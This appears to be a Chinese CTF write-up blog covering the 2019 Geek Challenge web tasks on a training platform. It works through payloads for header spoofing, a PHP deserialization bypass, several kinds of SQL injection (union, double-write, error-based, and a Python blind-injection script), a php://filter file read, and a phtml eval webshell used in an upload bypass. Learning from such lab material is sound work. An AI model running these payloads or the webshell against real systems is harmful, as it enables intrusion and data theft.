+<p><img src="/./../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111145609789-1731308171053-4.png" alt="image-20241111145609789"></p>
+<h4 id="1-Referer伪造请求来源网页"><a href="#1-Referer伪造请求来源网页" class="headerlink" title="1.Referer伪造请求来源网页"></a>1.Referer伪造请求来源网页</h4><p>发现并没有referer头，那就只能自己伪造一个了</p>
+<p>Referer: <a target="_blank" rel="noopener" href="https://sycsecret.buuoj.cn/">https://Sycsecret.buuoj.cn</a></p>
+<p>(记得放中间哈，放最后可能会send不出来)</p>
+<p><img src="/./../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111150156390-1731308518660-6.png" alt="image-20241111150156390"></p>
+<h4 id="2-User-Agent伪造请求用户"><a href="#2-User-Agent伪造请求用户" class="headerlink" title="2.User-Agent伪造请求用户"></a>2.User-Agent伪造请求用户</h4><p>User-Agent: Syclover</p>
+<p><img src="/./../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111150217001-1731308538274-8.png" alt="image-20241111150217001"></p>
+<h4 id="3-X-Forwarded-For内网伪装"><a href="#3-X-Forwarded-For内网伪装" class="headerlink" title="3.X-Forwarded-For内网伪装"></a>3.X-Forwarded-For内网伪装</h4><p>X-Forwarded-For: 127.0.0.1</p>
+<p><img src="/./../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111150322118-1731308603740-10-1731308605708-12-1731308607620-14-1731308609277-16.png" alt="image-20241111150322118"></p>
+<p>成功拿到flag！</p>
+<h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p><img src="/./../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111150708988-1731308832350-1.png" alt="image-20241111150708988"></p>
+<p>他说他有备份网址的习惯，盲猜是信息泄露</p>
+<p>先看看源代码</p>
+<p><img src="/./../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111150853118-1731308934392-3.png" alt="image-20241111150853118"></p>
+<h3 id="网站备份文件漏洞"><a href="#网站备份文件漏洞" class="headerlink" title="网站备份文件漏洞:"></a><strong>网站备份文件漏洞:</strong></h3><ul>
+<li>网站备份压缩文件 漏洞成因:在网站的升级和维护过程中，通常需要对网站中的文件进行修改。此时就需要对网站整站或者其中某一页面进行备份。当备份文件或者修改过程中的缓存文件因为各种原因而被留在网站 web 目录下，而该目录又没有设置访问权限时，便有可能导致备份文件或者编辑器的缓存文件被下载，导致敏感信息泄露，给服务器的安全埋下隐患。</li>
+<li><strong>该漏洞的成因</strong>主要有是管理员将备份文件放在到 web 服务器可以访问的目录下。</li>
+<li>该漏洞往往会导致服务器整站源代码或者部分页面的源代码被下载，利用。源代码中所包含的各类敏感信息，如服务器数据库连接信息，服务器配置信息等会因此而泄露，造成巨大的损失。</li>
+<li>被泄露的源代码还可能会被用于代码审计，进一步利用而对整个系统的安全埋下隐患。</li>
+</ul>
+<p>没什么可用的信息，那就扫一下目录</p>
+<p><code>dirsearch -u &quot;url&quot; -e*</code></p>
+<p>目录文件有点多，我闲着无聊就猜测一下是不是<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></p>
+<p>url&#x2F;<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></p>
+<p>发现真的有</p>
+<p>解压下来看看</p>
+<p><img src="/./../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111151654323-1731309415345-5.png" alt="image-20241111151654323"></p>
+<p>我以为到这里就结束了，结果发现是假的flag</p>
+<p>那就开其他文件看看</p>
+<p>在index.php中发现是页面源码，但多了几行代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line"><span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;select&#x27;</span>];</span><br><span class="line"><span class="variable">$res</span>=<span class="title function_ invoke__">unserialize</span>(@<span class="variable">$select</span>);</span><br></pre></td></tr></table></figure>
+
+<p>php反序列化</p>
+<p>那我们再看看class.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>php反序列化</p>
+<p>先审代码</p>
+<h3 id="construct-魔术方法"><a href="#construct-魔术方法" class="headerlink" title="__construct()魔术方法"></a>__construct()魔术方法</h3><p>构造函数，当一个对象创建时被调用</p>
+<p>这里是对username和password进行初始化赋值</p>
+<h3 id="wake-魔术方法"><a href="#wake-魔术方法" class="headerlink" title="__wake()魔术方法"></a>__wake()魔术方法</h3><p><strong>调用unserialize()时触发</strong>，反序列化恢复对象之前调用该方法，正常来说<code>wakeup</code>魔术方法会先被触发，然后再进行反序列化</p>
+<p>这里触发wakeup方法会将username赋值成guest</p>
+<h3 id="destruct-魔术方法"><a href="#destruct-魔术方法" class="headerlink" title="__destruct()魔术方法"></a>__destruct()魔术方法</h3><p>析构函数，<strong>当一个对象销毁时被调用</strong></p>
+<p>里面有两个判断句，第一个是当password不等于100的时候会执行die()函数；第二个是当username等于admin的时候会输出flag</p>
+<p>所以我们需要让username等于admin和password为100就可以拿到flag</p>
+<p>我们构造pop链</p>
+<p><strong>Name::construct()-&gt;Name::destruct()</strong></p>
+<p>paylaod:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#x27;flag.php&#x27;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Name&#123;</span><br><span class="line">    private $username = &#x27;nonono&#x27;;</span><br><span class="line">    private $password = &#x27;yesyes&#x27;;</span><br><span class="line"></span><br><span class="line">    public function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username = $username;</span><br><span class="line">        $this-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a  = new Name(&quot;admin&quot;,&quot;100&quot;);</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>输出处理的反序列化字符串是:<br><code>O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;s:3:&quot;100&quot;;&#125;</code></p>
+<p>为了避免触发wakeup魔术方法，我们还需要绕过方法</p>
+<h3 id="绕过wakeup方法其一"><a href="#绕过wakeup方法其一" class="headerlink" title="绕过wakeup方法其一"></a>绕过wakeup方法其一</h3><p>当目标类的成员属性个数大于实际个数的时候，可以绕过wakeup魔术方法，我们把反序列化字符串改一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:3:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;s:3:&quot;100&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后在属性那加上%00(因为成员属性类型是private，详细可以参考三种不同属性的序列化后字符串的格式)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>传入参数就可以拿到flag了</p>
+<h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p>打开是一个登录界面</p>
+<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111154133618-1731310894787-7.png" alt="image-20241111154133618"></p>
+<p>传入1&#x2F;1</p>
+<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111154205265-1731310926448-9.png" alt="image-20241111154205265"></p>
+<p>1.判断是否存在注入</p>
+<p>用单引号闭合试试看看是否存在注入</p>
+<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20241111154338754-1731311019919-11.png" alt="image-20241111154338754"></p>
+<p>如果页面报错，且报错信息中包含SQL语法错误或未闭合的引号等，则可能是SQL注入点，说明存在注入</p>
+<p>2.利用万能密码闭合</p>
+<p>试一下万能密码</p>
+<p>1’ or ‘1’&#x3D;’1’#</p>
+<p>发现flag出来了，说明万能密码是可以做的</p>
+<p>首先学习一下sql语句逻辑运算符的优先级，由于SQL语句中逻辑运算符的优先级（&#x3D;优先于AND，AND优先于OR），以及字符串拼接的特性，上述SQL语句实际上会被解析为两部分：</p>
+<p>SELECT*FROM table_name WHERE username&#x3D;’1’ or ‘1’&#x3D;’1’#’;and password&#x3D;’1’</p>
+<p>其中，1&#x3D;1恒为真。由于OR运算符的两侧只要有一侧为真，整个表达式就为真，因此整个查询条件就恒为真。这导致无论密码是什么，只要用户名是万能密码，用户都能通过验证。</p>
+<p>输入后成功获取flag</p>
+<h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250121004804689.png" alt="image-20250121004804689"></p>
+<p>万能密码能登进去但是没啥可用的信息</p>
+<p>常规的union联合注入就可以打</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">1&#x27; union select 1,2,3#回显位置为2和3</span><br><span class="line">1&#x27; union select 1,2,database()#数据库名为geek</span><br><span class="line">1&#x27; union select 1,2,(select group_concat(table_name)from information_schema.tables where table_schema=&#x27;geek&#x27;)#表名为geekuser,l0ve1ysq1</span><br><span class="line">1&#x27; union select 1,2,(select group_concat(column_name)from information_schema.columns where table_name=&#x27;l0ve1ysq1&#x27;)#列名为id,username,password</span><br><span class="line">1&#x27; union select 1,2,(select password from geek.l0ve1ysq1 where username=&#x27;flag&#x27;)#如果不加where子语句的话返回结果很长无法正常回显，所以我盲猜的flag</span><br></pre></td></tr></table></figure>
+
+<h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p>题目界面是一样的，但可以看到作者对网站进行了一定的加固</p>
+<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111155420887-1731311661949-13-1742810078858-63.png" alt="image-20241111155420887"></p>
+<p>常规做法，先试一下万能密码</p>
+<p>1’ or 1&#x3D;1#</p>
+<p>发现or不见了，猜测是被过滤了，</p>
+<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111190347533-1731323029026-47.png" alt="image-20241111190347533"></p>
+<p>可以再试试order，发现最后只剩der了，可以确定是or和by都被过滤了</p>
+<p>后面测试发现union,select这些关键词都被过滤了</p>
+<p>试一下双写绕过，发现可以绕过,应该绕过方法都是一样的，那就构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">1&#x27; oorrder bbyy 4#出错，字段数为3</span><br><span class="line">1&#x27; ununionion seselectlect 1,2,3#回显位置为2和3</span><br><span class="line">1&#x27; ununionion seselectlect 1,2,database()#数据库名为geek</span><br><span class="line">1&#x27; ununionion seselectlect 1,2,(seselectlect group_concat(column_name)frfromom infoorrmation_schema.columns whwhereere table_name=&#x27;b4bsql&#x27;)#表名为b4bsql,geekuser</span><br><span class="line">1&#x27; ununionion seselectlect 1,2,(seselectlect group_concat(column_name)frfromom infoorrmation_schema.columns whwhereere table_name=&#x27;b4bsql&#x27;)#列名为id,username,password</span><br><span class="line">-1&#x27; ununionion seselectlect 1,2,(seselectlect passwoorrd frfromom geek.b4bsql whwhereere username=&#x27;flag&#x27;)#</span><br></pre></td></tr></table></figure>
+
+<h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20250121124832767.png" alt="image-20250121124832767"></p>
+<p>传入关键词发现有警告，双写和大小写都没办法绕过，然后测出来发现sleep，union，substr等函数名都被过滤了</p>
+<p>可以用报错注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;or(updatexml(1,concat(0x7e,(select(database())),0x7e),3))#</span><br><span class="line">XPATH syntax error: &#x27;~geek~&#x27;</span><br><span class="line">空格被过滤了，我们用括号去绕过</span><br><span class="line">-1&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))#</span><br><span class="line">XPATH syntax error: &#x27;~H4rDsq1~&#x27;</span><br><span class="line">等于号也被过滤了，用like绕过</span><br><span class="line"></span><br><span class="line">-1&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;H4rDsq1&#x27;)),0x7e),1))#</span><br><span class="line">XPATH syntax error: &#x27;~id,username,password~&#x27;</span><br><span class="line"></span><br><span class="line">-1&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)where(username)like(&#x27;flag&#x27;)),0x7e),1))#</span><br><span class="line">XPATH syntax error: &#x27;~flag&#123;e6f22b98-2bd0-4db8-9083-af&#x27;</span><br><span class="line">漏了一部分flag，我们用right函数去拿</span><br><span class="line"></span><br><span class="line">-1&#x27;or(updatexml(1,concat(0x7e,(select(right(password,14))from(H4rDsq1)where(username)like(&#x27;flag&#x27;)),0x7e),1))#</span><br><span class="line">忘记复制粘贴了.....</span><br></pre></td></tr></table></figure>
+
+<h2 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h2><p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20250121011804340.png" alt="image-20250121011804340"></p>
+<p>分别点击那几个数字之后没啥可用的信息，但是我们在url中发现id参数，fuzz一下发现引号被过滤了，测出<code>^</code>符号可以使用，可以试试盲注</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">?id=1^(length(database())&gt;1)页面返回error</span><br></pre></td></tr></table></figure>
+
+<p>能打那就直接上脚本</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://968a873e-bab6-4c98-89f0-71a63e1d8708.node5.buuoj.cn:81/search.php&quot;</span></span><br><span class="line"></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        payload=<span class="string">f&quot;?id=1^(ascii(substr((Select(group_concat(password))from(F1naI1y)where(username=&#x27;flag&#x27;)),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;j&#125;</span>)--+&quot;</span></span><br><span class="line">        r=requests.get(url+payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;ERROR&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag +=<span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(flag))</span><br></pre></td></tr></table></figure>
+
+<h2 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h2><p>打开页面</p>
+<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111173046086-1731317448508-15.png" alt="image-20241111173046086"></p>
+<p>查看页面源代码发现一段隐藏代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">        &lt;!--</span><br><span class="line">$cat=$_GET[&#x27;cat&#x27;];</span><br><span class="line">echo $cat;</span><br><span class="line">if($cat==&#x27;dog&#x27;)&#123;</span><br><span class="line">    echo &#x27;Syc&#123;cat_cat_cat_cat&#125;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
+
+<p>直接get传入cat&#x3D;dog就可以拿到flag了</p>
+<h2 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h2><p>查看题目</p>
+<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111173758449-1731317879848-19.png" alt="image-20241111173758449"></p>
+<p>看看源代码有没有可用的信息</p>
+<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111175056679-1731318658497-21.png" alt="image-20241111175056679"></p>
+<p>发现一个Archive_room.php</p>
+<p>访问看看</p>
+<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111175119374-1731318681097-23.png" alt="image-20241111175119374"></p>
+<p>有一个按钮链接，点一下就跳转结束了</p>
+<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111175201233-1731318722812-25.png" alt="image-20241111175201233"></p>
+<p>那就抓包再send一次试试</p>
+<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111175315956-1731318797510-27.png" alt="image-20241111175315956"></p>
+<p>看到了一个被注释掉的secr3t.php</p>
+<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111175355811-1731318837374-29.png" alt="image-20241111175355811"></p>
+<p>是include()包含rce代码执行</p>
+<ul>
+<li>include()函数</li>
+</ul>
+<p><strong>include就是包含文件的函数，把$file的内容包含进来.</strong></p>
+<p><strong>include()函数并不在意被包含的文件是什么类型，只要有php代码，都会被解析出来</strong></p>
+<ul>
+<li>strstr()函数</li>
+</ul>
+<p><code>strstr</code> 函数用于查找一个字符串在另一个字符串中的首次出现。如果找到了，它会返回从匹配位置到字符串末尾的部分；如果没有找到，则返回 <code>false</code>。<code>strstr</code> 是区分大小写的。</p>
+<ul>
+<li>函数原型</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php</span><br><span class="line">string strstr ( string $haystack , string $needle [, bool $before_needle = false ] )</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>**<code>$haystack</code>**：要搜索的字符串，即干草堆。</li>
+<li>**<code>$needle</code>**：要查找的子字符串，即针。</li>
+<li>**<code>$before_needle</code>**（可选）：如果设置为 <code>true</code>，则返回 <code>$needle</code> 出现之前的部分；如果未设置或设置为 <code>false</code>，则返回从 <code>$needle</code> 出现的位置开始到 <code>$haystack</code> 末尾的部分。</li>
+</ol>
+<p>解析代码:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))</span><br></pre></td></tr></table></figure>
+
+<p>用strstr去匹配这些字符串，如果符合则会进行if语句执行exit</p>
+<p>既然input和data被禁用了，很明显了，我们可以用filter伪协议去读文件</p>
+<p>php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
+<p>然后会返回base64编码的字符串，解码一下就可以看到flag了</p>
+<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111180542885-1731319544378-31.png" alt="image-20241111180542885"></p>
+<h2 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h2><p>打开题目就看到了一句话木马</p>
+<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111181358741-1731320040380-33.png" alt="image-20241111181358741"></p>
+<p>但因为我们不确定这个一句话木马是不是写在这个网站下</p>
+<p>先看看源码</p>
+<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111181515797-1731320116909-35.png" alt="image-20241111181515797"></p>
+<p>查看源码发现一句话木马是写在当前网站下的</p>
+<p>那就直接用蚁剑连，密码就是Syc，连上后在更目录就可以zhao’d</p>
+<p>(其实我个人理解蚁剑就是一个自动的rce工具，密码就是传入rce的参数，蚁剑可以通过这个参数执行命令获取目录以及文件内容，并整合起立返回给我们)</p>
+<h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111183058737-1731321059960-37.png" alt="image-20241111183058737"></p>
+<p>黑盒测试的文件上传漏洞</p>
+<p>先传一个一句话木马文件试试，发现有文件类型限制</p>
+<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111183232544-1731321153685-39.png" alt="image-20241111183232544"></p>
+<p>抓包修改文件后缀判断一下是不是前端验证，然后发现</p>
+<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111185030775-1731322231946-41.png" alt="image-20241111185030775"></p>
+<p>可见是对文件后缀过滤了php，试试绕过后缀，发现双写可以绕过，但是对<code>&lt;?</code>进行了过滤，那我们换成phtml格式的一句话木马</p>
+<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111185201905-1731322322914-43.png" alt="image-20241111185201905"></p>
+<p>绕过文件后缀验证了，但也对文件内容进行了检查</p>
+<p>那就直接用phtml一句话木马去做吧</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">phtml</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_REQUEST[cmd])&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
